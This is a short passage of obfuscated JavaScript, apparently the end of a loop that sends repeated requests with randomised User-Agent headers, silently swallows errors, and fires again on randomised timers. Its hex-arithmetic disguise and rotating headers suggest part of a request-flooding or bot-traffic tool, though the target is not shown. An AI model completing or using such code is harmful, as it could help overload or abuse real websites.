        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1525 + -0x15cd + 0x464a) * getRandomInt(0x15ec + -0x449 + 0x25 * -0x7a, 0x12e1 + -0x32f * 0xa + 0xcfa));
}, 0x19c5 + -0x38a + -0x15d7);